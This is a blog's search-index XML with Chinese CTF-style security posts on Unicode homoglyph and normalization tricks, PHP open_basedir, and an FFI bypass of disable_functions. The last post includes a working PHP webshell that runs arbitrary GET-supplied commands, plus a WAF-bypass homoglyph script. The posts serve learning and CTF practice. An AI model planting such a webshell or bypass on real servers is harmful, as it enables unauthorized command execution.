<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>unicode详解以及有关的安全问题</title>
      <link href="/2021/04/20/2021-04-20-shen-qi-de-unicode/"/>
      <url>/2021/04/20/2021-04-20-shen-qi-de-unicode/</url>
      
        <content type="html"><![CDATA[<h1 id="unicode详解以及有关的安全问题"><a href="#unicode详解以及有关的安全问题" class="headerlink" title="unicode详解以及有关的安全问题"></a>unicode详解以及有关的安全问题</h1><p><strong>关于编码的几个关键问题</strong></p><p>1.文本编辑器是怎么将二进制形式翻译成字符的？</p><p>2.字节是怎样分组的？</p><p>3.一个或多个字节是怎么映射到字符上的？</p><p>维基百科中这样解释：<a href="http://en.wikipedia.org/wiki/Character_encoding" target="_blank" rel="noopener"><strong>Character Encoding</strong></a></p><p>大致说来，编码定义了两件事：</p><p>1,字节是怎么分组的，如8 bits或16 bits一组，这也被称作编码单元。</p><p>2,编码单元和字符之间的映射关系。例如，在ASCII码中，十进制65映射到字母A上</p><p>字符编码和字符集之间有微小的区别。不过通常它和你无关，除非你在设计一个底层的库。</p><p>(准确地说，utf-8是字符编码，unicode是字符集)</p><p>区别在哪呢？来看看Python中将一个字符以unicode和utf-8输出有什么区别吧（linux上）</p><p><img src="/img/image-20210420183639069.png" alt="image-20210420183639069"></p><p>我自己本地没复现成功，Windows和Linux都没，合理猜测是python版本问题</p><p><img src="/img/image-20210420183811069.png" alt="image-20210420183811069"></p><p>这里unicode和utf-8体现出地区别在哪儿呢？</p><p>区别在于，一个字符在unicode里，和ascii一样，只是由一个数字代表，而utf8则可以看到它的编码方式，一个中文的’我’字，由\xe6\x88\x91组成，这就是它在计算机内存里的表达方式，而在unicode里面，它仅仅只是由“6211”这个数字代表的字符。</p><p>这就是字符集（unicode）和字符编码/编码规则（utf-8）的区别</p><p>字符集：为每个字符分配一个’ID’，具体怎么实现不管（code point）</p><p>编码规则：将（code point）转换为实体字符的规则（类似加密解密）</p><blockquote><p>Unicode并不涉及字符是怎么在字节中表示的，它仅仅指定了字符对应的数字，仅此而已。</p><p>关于Unicode的其它误解包括：Unicode支持的字符上限是65536个，Unicode字符必须占两个字节。告诉你这些的人应该去换换脑子了。</p><p>记住，Unicode只是一个用来映射字符和数字的标准。它对支持字符的数量没有限制，也不要求字符必须占两个、三个或者其它任意数量的字节。</p><p>Unicode并不告诉你字符是怎么编码成字节的。这是被编码方案决定的，通过UTF来指定。</p></blockquote><h2 id="计算机编码的发展历史"><a href="#计算机编码的发展历史" class="headerlink" title="计算机编码的发展历史"></a>计算机编码的发展历史</h2><p>转自 <a href="https://www.freebuf.com/articles/web/25623.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/25623.html</a></p><p>很久以前，计算机制造商有自己的表示字符的方式。他们并不需要担心如何和其它计算机交流，并提出了各自的方式来将字形渲染到屏幕上。随着计算机越来越流行，厂商之间的竞争更加激烈，在不同的计算机体系间转换数据变得十分蛋疼，人们厌烦了这种自定义造成的混乱。</p><p>最终，计算机制造商一起制定了一个标准的方法来描述字符。他们定义使用一个字节的低7位来表示字符，并且制作了如上图所示的对照表来映射七个比特的值到一个字符上。例如，字母A是65，c是99，~是126等等， ASCII码就这样诞生了。原始的ASCII标准定义了从0到127 的字符，这样正好能用七个比特表示。不过好景不长。。。</p><p>为什么选择了7个比特而不是8个来表示一个字符呢？我并不关心。但是一个字节是8个比特，这意味着1个比特并没有被使用，也就是从128到255的编码并没有被制定ASCII标准的人所规定，这些美国人对世界的其它地方一无所知甚至完全不关心。</p><p>其它国家的人趁这个机会开始使用128到255范围内的编码来表达自己语言中的字符。例如，144在阿拉伯人的ASCII码中是<strong>گ</strong>，而在俄罗斯的ASCII码中是<strong>ђ</strong>。即使在美国，对于未使用区域也有各种各样的利用。IBM PC就出现了“OEM 字体”或”扩展ASCII码”，为用户提供漂亮的图形文字来绘制文本框并支持一些欧洲字符，例如英镑（£）符号。</p><p><img src="https://image.3001.net/images/ue/76061392173334.png" alt="lpcec9qu3zw3u5uldh_bnawejbesszsmhiv2jm-pyemhgj2ky0vkvn0ousiaqvmv4kmsg_gmhhlhwcbem-uem4wcxkm5hcungr3r7bibhm1ievimyks2cxidbg"></p><p>用IBM扩展字符集绘制的很酷的DOS启动画面</p><p>再强调一遍，ASCII码的问题在于尽管所有人都在0-127号字符的使用上达成了一致，但对于128-255号字符却有很多很多不同的解释。你必须告诉计算机使用哪种风格的ASCII码才能正确显示128-255号的字符。</p><p>这对于北美人和不列颠群岛的人来说不算什么问题，因为无论使用哪种风格的ASCII码，拉丁字母的显示都是一样的。英国人还需要面对的问题是原始的ASCII码中不包含英镑符号，但是这个已经无关紧要了。</p><p>与此同时，在亚洲有更让人头疼的问题。亚洲语言有更多的字符和字形需要被存储，一个字节已经不够用了。所以他们开始使用两个字节来存储字符，这被称作DBCS（双字节编码方案）。在DBCS中，字符串操作变得很蛋疼，你应该怎么做str++或str–？</p><p>这些问题成为了系统开发者的噩梦。例如，MS  DOS必须支持所有风格的ASCII码，因为他们想把软件卖到其他国家去。他们提出了「内码表」这一概念。例如，你需要告诉DOS（通过使用”chcp”命令）你想使用保加利亚语的内码表，它才能显示保加利亚字母。内码表的更换会应用到整个系统。这对使用多种语言工作的人来说是一个问题，因为他们必须频繁的在几个内码表之间来回切换。</p><p>尽管内码表是一个好主意，但是它不是一个简洁的解决方案，它只是一个hack技术或者说是简单的修正来让编码系统可以工作。</p><p><strong>进入Unicode的世界</strong></p><p>最终，美国人意识到他们应该提出一种标准方案来展示世界上所有语言中的所有字符，以便缓解程序员的痛苦和避免字符编码引发的第三次世界大战。出于这个目的，Unicode诞生了。</p><p>Unicode背后的想法非常简单，然而却被普遍的误解了。Unicode就像一个电话本，标记着字符和数字之间的映射关系。Joel称之为「神奇数字」，因为它们可能是随机指定的，而且不会给出任何解释。官方术语是码位(Code Point)，总是用U+开头。理论上每种语言中的每种字符都被Unicode协会指定了一个神奇数字。例如希伯来文中的第一个字母<strong>א</strong>，是U+2135，字母A是U+0061。</p><p>Unicode并不涉及字符是怎么在字节中表示的，它仅仅指定了字符对应的数字，仅此而已。</p><p>关于Unicode的其它误解包括：Unicode支持的字符上限是65536个，Unicode字符必须占两个字节。告诉你这些的人应该去换换脑子了。</p><p>记住，Unicode只是一个用来映射字符和数字的标准。它对支持字符的数量没有限制，也不要求字符必须占两个、三个或者其它任意数量的字节。</p><p>Unicode字符是怎样被编码成内存中的字节这是另外的话题，它是被UTF(Unicode Transformation Formats)定义的。</p><p><strong>这里有个有趣的知识：没有纯文本这回事</strong></p><p>既然没有「纯文本」文件这回事，那你的文本编辑器和浏览器为什么每次都能正确的显示内容呢？答案是，那些软件欺骗了你，这也是为什么那么多人对编码一无所知。当软件不能确定编码的时候，它会猜测。大部分时候，它会猜测是否是涵盖了ASCII码的UTF-8，还是ISO-8859-1，也有可能猜其他能想到的任意字符集。因为英文中使用的拉丁字母表在几乎所有的字符集中都能显示，包括UTF-8，所以即使编码猜错了，英文字母看起来也是正确的。</p><p>但是，如果你在浏览网页时看到�符号，这意味着这个网页的编码不是你的浏览器猜测的那个。这时你可以点开浏览器的<em>查看</em>-&gt;<em>字符编码</em>菜单来尝试不同的编码。</p><h2 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h2><p>上面已经将Unicode的意义讲透了，接下来就是实际技术了。</p><p>这里有篇讲Unicode同形字引起的安全问题的文章：<a href="https://paper.seebug.org/77/" target="_blank" rel="noopener">https://paper.seebug.org/77/</a></p><p>写过一些ctf题的应该都见过用外型类似的unicode字符代替原字符进行攻击的的题目。</p><p>这里的问题是：</p><p>Unicode字符无非也是一种字符而已，只要程序支持，应该不会有任何问题。为什么这个unicode字符在处理过程中变成了另外一个字符，而且是看起来很相似的字符，难道程序也跟人眼看一样，被相同的外表迷惑了？这显然是不可能的。</p><p>这里有一篇很古老的文章提到了这个问题：<a href="https://www.peterbe.com/plog/unicode-to-ascii" target="_blank" rel="noopener">https://www.peterbe.com/plog/unicode-to-ascii</a></p><p>大致原理其实是有专门的unicode转ascii函数，对unicode与同形的ascii之间有对应的map。会将一些类似的unicode字符转换成ascii字符。</p><p>如上面这篇文章中的<code>unicodedata.normalize</code>函数。</p><p>这里有一个大佬写的脚本，用于遍历这个函数中可用来替换ascii码的unicode同型字符。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> json<span class="token keyword">from</span> unicodedata <span class="token keyword">import</span> normalize<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug <span class="token operator">=</span> <span class="token boolean">False</span>    tables <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        src <span class="token operator">=</span> unichr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        dst <span class="token operator">=</span> normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ord<span class="token punctuation">(</span>dst<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token operator">and</span> dst <span class="token operator">!=</span> src<span class="token punctuation">:</span>                <span class="token keyword">if</span> debug<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s (\\u%s) -- normalize --> %s (\\x%s)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>                        src<span class="token punctuation">,</span> hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                        dst<span class="token punctuation">,</span> hex<span class="token punctuation">(</span>dst<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    <span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> dst <span class="token keyword">in</span> tables<span class="token punctuation">:</span>                    tables<span class="token punctuation">[</span>dst<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>src<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    tables<span class="token punctuation">[</span>dst<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>src<span class="token punctuation">]</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"nfctable.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fh<span class="token punctuation">:</span>        json<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>tables<span class="token punctuation">,</span> fh<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以用于Bypass某些WAF或过滤</p><h3 id="其它技巧"><a href="#其它技巧" class="headerlink" title="其它技巧"></a>其它技巧</h3><p><strong>字符删除</strong></p><p>例如 <code>\x3c\x73\x63\x72\xc2\x69\x70\x74\x3e</code> 这个字符串中，而 <code>\xc2</code> 并不是任何一个有效字符的子串，在一些处理逻辑中，可能会删除 <code>\xc2</code> 这个字符，从而导致问题。</p><p><strong>字符替换</strong></p><p>一些情况下，字符会被替换为其他的字符 如U+FFFF会被替换成 <code>?</code> 这在一些 <code>?</code> 有明确语义的情况下就会出现问题。不过关于这种利用只是存在理论上利用的可能性</p><p><strong>缓冲区溢出</strong></p><p>在一些大小写转换时，字符会变多，例如 <code>'ß'.toUpperCase()</code> 的运行结果是 <code>SS</code>。如果字符串的长度检查在大小写转换之前，就可能会存在缓冲区溢出问题。</p><p><strong>这里有个buu的题目</strong></p><p>[ASIS 2019]Unicorn shop <a href="https://buuoj.cn/challenges#[ASIS%202019]Unicorn%20shop" target="_blank" rel="noopener">https://buuoj.cn/challenges#[ASIS%202019]Unicorn%20shop</a></p><p>题目就是后台有个<code>unicodedata.numeric()</code>函数，会将unicode字符转换成等价的数字。</p><p>把一个值大于1337的unicode字符输进价格栏就行。</p><p>wp各种花里胡哨的unicode字符，实际上只要用中文的”万”就行了，这也是unicode字符。</p><p>post传参</p><pre><code>id=4&amp;price=万</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机科学技术 </tag>
            
            <tag> 编码 </tag>
            
            <tag> Unicode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>open_basedir详解</title>
      <link href="/2021/03/08/2021-3-8-open-basedir-xiang-jie/"/>
      <url>/2021/03/08/2021-3-8-open-basedir-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="open-basedir详解"><a href="#open-basedir详解" class="headerlink" title="open_basedir详解"></a>open_basedir详解</h1><p>PHP 的 open_basedir 和 disable_functions 这两个配置在web中非常常见，前几天粗浅地研究了bypass disable_functions，再来了解一下open_basedir</p><p><strong><code>open_basedir</code> 官方介绍</strong></p><pre><code>open_basedir string</code></pre><p> 将 PHP 所能打开的文件限制在指定的目录树，包括文件本身。本指令不受安全模式打开或者关闭的影响。<br> 当一个脚本试图用例如 fopen() 或者 gzopen() 打开一个文件时，该文件的位置将被检查。<br> 当文件在指定的目录树之外时 PHP 将拒绝打开它。<br> 所有的符号连接都会被解析，所以不可能通过符号连接来避开此限制。<br> 特殊值 . 指明脚本的工作目录将被作为基准目录。但这有些危险，因为脚本的工作目录可以轻易被 chdir() 而改变。</p><p>在 httpd.conf 文件中中，open_basedir 可以像其它任何配置选项一样用“php_admin_value open_basedir none”的方法关闭（例如某些虚拟主机中）。</p><p>在 Windows 中，用分号分隔目录。在任何其它系统中用冒号分隔目录。作为 Apache 模块时，父目录中的 open_basedir 路径自动被继承。</p><p><strong><em>用 open_basedir 指定的限制实际上是前缀，不是目录名</em></strong></p><p> 也就是说“<code>open_basedir = /dir/incl</code>”也会允许访问“<code>/dir/include</code>”和“<code>/dir/incls</code>”，如果它们存在的话。</p><p>如果要将访问限制在仅为指定的目录，用斜线结束路径名。例如：“<code>open_basedir = /dir/incl/</code>”。</p><h2 id="有几种方式设置限制包含目录"><a href="#有几种方式设置限制包含目录" class="headerlink" title="有几种方式设置限制包含目录"></a>有几种方式设置限制包含目录</h2><p>1）php.ini  </p><pre class="line-numbers language-ini"><code class="language-ini"><span class="token constant">open_basedir</span> <span class="token attr-value"><span class="token punctuation">=</span> /home/wwwroot/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）在程序中使用</p><pre><code>ini_set('open_basedir', '指定目录');1</code></pre><p>但不建议使用这种方法</p><p> 3）apache 的 httpd.conf 中Directory配置</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">"php_admin_value open_basedir none"</span> <span class="token comment" spellcheck="true"># 关闭 </span>php_admin_value open_basedir <span class="token string">"/home/wwwroot/:/tmp/:/var/tmp/:/proc/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>httpd.conf中VirtualHost</p><pre class="line-numbers language-bash"><code class="language-bash">php_admin_value open_basedir <span class="token string">"/home/wwwroot/:/tmp/:/var/tmp/:/proc/"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）nginx fastcgi.conf</p><pre class="line-numbers language-bash"><code class="language-bash"> fastcgi_param PHP_VALUE <span class="token string">"open_basedir=<span class="token variable">$document_root</span>:/tmp/"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）.user.ini 文件<br> 设置方法同 1 ，即：</p><pre class="line-numbers language-ini"><code class="language-ini"><span class="token constant">open_basedir</span> <span class="token attr-value"><span class="token punctuation">=</span> /home/wwwroot/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CTF中利用方法举例"><a href="#CTF中利用方法举例" class="headerlink" title="CTF中利用方法举例"></a>CTF中利用方法举例</h3><p>执行系统命令，利用 php cli <strong>在目标机器本地开启一个新的web服务</strong>，然后再用受限制的 webshell <strong>转发请求到新开启的服务上</strong>去。</p><pre class="line-numbers language-shell"><code class="language-shell">php -n -S 127.0.0.1:61111 -t /var/www/html/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解释一下里面的几个参数：</p><p><strong>-S 127.0.0.1:61111</strong> : 新web服务监听地址</p><p><strong>-t /var/www/html/</strong> : 新http服务的Web根目录，可随便指，只要保证那个目录下面有个 php webshell 就行，建议是直接指定成 shell 当前目录</p><p><strong>-n</strong> : 表示不使用 php.ini, 这个新的服务PHP用的是默认配置，核心所在</p><p>当然思路不止这一种，还有用 反弹shell,python,perl 等等思路。</p><p><strong>但设想一种比较极端的情况：</strong></p><p>  目标机器<strong>无法主动外连</strong>，并且入站<strong>只有80端口可访问</strong>，目标机器上面<strong>不保证一定有python, 不一定有 perl</strong>。我们能肯定的是，应该是有php的，<strong>但美中不足的是PHP在5.4版本才引入了 -S 这个内置web服务器</strong></p><p>  最终我们就把整个绕过暴力的简化成了绕过disable_functions</p><p>这也是蚁剑插件中绕过bypass disable_functions的方法。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
            <tag> open_basedir </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FFI扩展 bypass disable functions</title>
      <link href="/2021/03/08/2021-3-8-ffi-php-kuo-zhan-ren-yi-ming-ling-zhi-xing/"/>
      <url>/2021/03/08/2021-3-8-ffi-php-kuo-zhan-ren-yi-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="FFI扩展-bypass-disable-functions"><a href="#FFI扩展-bypass-disable-functions" class="headerlink" title="FFI扩展 bypass disable functions"></a>FFI扩展 bypass disable functions</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote><p>FFI（Foreign Function  Interface），即外部函数接口，允许从用户区调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP  7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass  disable_functions</p></blockquote><p>也就是说，只要目标环境中的PHP开启了FFI扩展，如果我们能上传文件或写入恶意代码到web目录中，便可以利用FFI调用C语言中的函数来执行命令，从而绕过disable functions。</p><p>核心语句为</p><p>FFI::cdef</p><pre><code>FFI::cdef([string $cdef = "" [, string $lib = null]]): FFI//告诉PHP FFI我们要调用的函数原型</code></pre><p>例如，调用<code>libcurl</code>库函数</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//curl.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">const</span> <span class="token constant">CURLOPT_URL</span> <span class="token operator">=</span> <span class="token number">10002</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PHP预定义好了CURLOPT_等option的值，但这里我们需要自己定义，简单的办法就是查看curl的头文件，找到对应的值，然后把值给加进去</span><span class="token variable">$libcurl</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">CTYPE</span>void <span class="token operator">*</span><span class="token function">curl_easy_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>int <span class="token function">curl_easy_setopt</span><span class="token punctuation">(</span>void <span class="token operator">*</span>curl<span class="token punctuation">,</span> int option<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>int <span class="token function">curl_easy_perform</span><span class="token punctuation">(</span>void <span class="token operator">*</span>curl<span class="token punctuation">)</span><span class="token punctuation">;</span>void <span class="token function">curl_easy_cleanup</span><span class="token punctuation">(</span>void <span class="token operator">*</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">CTYPE</span> <span class="token punctuation">,</span> <span class="token string">"libcurl.so"</span>        <span class="token comment" spellcheck="true">//声明我们引用的函数来自libcurl.so动态库</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样我们就能在其它php文件中通过简单的引用来使用libcurl库中的函数了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require</span> <span class="token string">"curl.php"</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> "https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.laruence.com/2020/03/11/5475.html";</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token variable">$libcurl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">curl_easy_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$libcurl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">curl_easy_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$libcurl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">curl_easy_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$libcurl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">curl_easy_perform</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$libcurl</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">curl_easy_cleanup</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="在CTF中使用"><a href="#在CTF中使用" class="headerlink" title="在CTF中使用"></a>在CTF中使用</h3><p>当我们利用webshell获得了一定的执行权限，但需要绕过disable functions时，如果对方服务器版本大于等于7.4，便可以尝试使用FFI制造命令执行</p><p>上传一个ffi.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"$cmd > /tmp/123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//由GET传参的任意代码执行</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$ffi</span> <span class="token operator">=</span> <span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token string">"int system(const char *command);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/readflag > /tmp/123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//任意代码执行</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/tmp/123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/tmp/123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码逻辑非常简单</p><p>可访问该文件通过GET传参的方式传入我们想执行的命令，命令是通过C语言的system函数执行的，用这种方式绕过了disable functions。</p><p>将返回结果写入/tmp/123，并在每次读出结果后用<code>unlink()</code>函数删除它。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
            <tag> bypass disable functions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识web socket</title>
      <link href="/2021/03/07/2021-3-7-chu-shi-web-socket/"/>
      <url>/2021/03/07/2021-3-7-chu-shi-web-socket/</url>
      
